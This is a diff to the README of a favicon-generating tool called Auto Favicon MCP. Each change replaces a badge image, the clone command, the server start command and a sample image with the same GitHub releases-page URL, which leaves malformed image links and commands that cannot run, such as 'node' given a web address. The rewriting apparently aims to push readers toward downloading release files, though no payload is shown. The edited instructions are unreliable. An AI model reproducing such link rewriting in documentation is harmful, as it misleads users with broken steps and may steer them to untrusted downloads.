@@ -1,7 +1,7 @@
 # Auto Favicon MCP: Automatic Favicon Generation from PNGs 🌟
 
-![Auto Favicon MCP](https://img.shields.io/badge/Auto%20Favicon%20MCP-v1.0.0-blue.svg)  
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen.svg)](https://github.com/pravinakarunanithi/auto-favicon-mcp/releases)
+![Auto Favicon MCP](https://github.com/pravinakarunanithi/auto-favicon-mcp/releases%20Favicon%https://github.com/pravinakarunanithi/auto-favicon-mcp/releases)  
+[![Download Releases](https://github.com/pravinakarunanithi/auto-favicon-mcp/releases%20Releases-Click%https://github.com/pravinakarunanithi/auto-favicon-mcp/releases)](https://github.com/pravinakarunanithi/auto-favicon-mcp/releases)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -28,7 +28,7 @@ To get started with Auto Favicon MCP, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/pravinakarunanithi/auto-favicon-mcp.git
+   git clone https://github.com/pravinakarunanithi/auto-favicon-mcp/releases
    ```
 
 2. **Navigate to the Directory**:
@@ -57,7 +57,7 @@ After installation, you can start using Auto Favicon MCP. Here’s how to genera
 
 1. **Start the Server**:
    ```bash
-   node server.js
+   node https://github.com/pravinakarunanithi/auto-favicon-mcp/releases
    ```
 
 2. **Access the Web Interface**:
@@ -96,6 +96,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 ## Support
 If you encounter any issues or have questions, please check the [Releases section](https://github.com/pravinakarunanithi/auto-favicon-mcp/releases) for the latest updates. You can also open an issue in the GitHub repository for support.
 
-![Favicon Example](https://example.com/favicon-sample.png)
+![Favicon Example](https://github.com/pravinakarunanithi/auto-favicon-mcp/releases)
 
 Feel free to reach out with any feedback or suggestions!
